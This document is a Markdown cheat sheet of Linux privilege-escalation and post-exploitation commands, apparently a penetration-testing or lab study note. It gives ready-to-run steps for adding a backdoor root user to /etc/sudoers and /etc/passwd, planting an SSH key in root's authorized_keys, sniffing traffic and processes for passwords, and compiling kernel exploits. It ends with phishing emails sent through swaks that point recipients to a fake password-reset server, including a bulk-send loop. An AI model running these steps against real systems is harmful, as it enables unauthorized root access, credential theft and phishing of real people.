#### Check Kernel Info

- uname -a
- cat /etc/issue
- cat /etc/os-release

#### Check for Writable Files?

- find / -type d -maxdepth 5 -writable 2>/dev/null
- find / -writable -type f 2>/dev/null

#### Check for writable files for all users

- find / -type f -perm 0777

#### Writable to /etc/sudoers?

- echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers
- sudo su hacker

#### Writable to /root/.ssh/authorized_keys ?

- generate our own key
  - ssh-keygen -t rsa -b 4096 -f ~/my_root_key
- add our key to /root/.ssh/authorized_keys
  - echo "key here" >> /root/.ssh/authorized_keys
- ssh to the target box

#### Exploit Require Compiling

- /proc/version
- gcc exploit-file.c -o exploit-file.c

#### Check for ENV path for potential information

- cat .bashrc

#### Check SUDO privilege

- sudo -l

#### Interesting places to check?

- check /opt/

#### Service & Process

- Check system running process
  - `ps aux` - list running processs
  - `watch -n 1 "ps -aux | grep pass"` - look for anything with running process that might include passwords
  - `sudo tcpdump -i lo -A | grep "pass"`

#### Cron Jobs

- Check for Cron Jobs, also repeat these replacing cron with anacron
  - `ls /etc/cron.*`
  - `ls /var/spool/cron`
  - `cat /etc/crontab` - check for crons
  - anything running as root in the /opt ?
  - `ls -lah /etc/cron*`
    - check insecure file permissions, since most jobs in this particular file will run as root
  - check cron tab under current user
    - `crontab -l`
  - `grep "CRON" /var/log/syslog` - check for running cron jobs which root own and we can edit the file as low level user
    - `ls -lah` - check to see if our low level user's permission on the script

#### Password Authentication Abuse

- only work if we can write to `/etc/passwd`
- add a new user + password to it as root user and switch to it
  - `pw=$(openssl passwd Password123); echo "hacker2:${pw}:0:0:root:/root:/bin/bash" >> /etc/passwd`
  - switch to that user via `su hacker` if you already have a working shell

#### Setuid Binaries & Capabilities

- SUID
  - `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null` - list SUID own by root user
  - `find / -type f -perm -04000 -ls 2>/dev/null` - list files that have SUID or SGID bits set
- Capabilities
  - `getcap` - list enabled capabilities

#### Kernel Exploit

- check the Linux Exploit Suggester

  - try anything that is Exposure: highly probable

- `cat /etc/issue` - check ver of linux
- `uname -r` - check kernel version
- `arch` - check system architecture
- `dpkg -l sudo` - check sudo version

#### Local Port listening check

check for anything that listen locally `ss -lntu`

#### Linux Shit

- if there is a github
  - dump the github via git_dumper.py then go into the .git directory and use `git log` & `git show`

#### Use pspy64 for suspicious process/service running in the back

#### nopasswd: ALL

- do `sudo -i` to get a shell as root

#### Installed applications

- dpkg -l

#### SSH

- file path for id_rsa location
  `/home/anita/.ssh/id_rsa or id_ecdsa
`/home/anita/.ssh/authorized_keys`

- ssh with id_rsa key
  `ssh -i <id_rsa_file> <user><ip-address>`

- fixing the Permissions 0664 for 'id_rsa' are too open error
  `chmod 600 id_rsa`

#### Create a wordlist

create possible users

- `cewl http://postfish.off/team.html -m 5 -w team.txt`

create passwords

- `cewl -d 5 http://postfish.off/team.html -w possible_passwords.txt`

#### Convert Upper to Lower

Convert a file with uppers to lower

- `tr A-Z a-z < possible_passwords.txt > temp.txt && mv temp.txt possible_passwords.txt`

#### Send Mail using SWAKS

to single user

- `swaks --to Mike.Ross@postfish.off  --from it@postfish.off --header "Subject:password reset link" --body "Hey team, as discussed in our previous email, reset your passwords at http://192.168.45.224" --server 192.168.113.137`

to multiple user

- while IFS= read -r email; do
  swaks --to "$email" --from it@postfish.off --header "Subject: password reset link" --body "Hey team, as discussed in our previous email, reset your passwords at http://192.168.45.224" --server 192.168.113.137
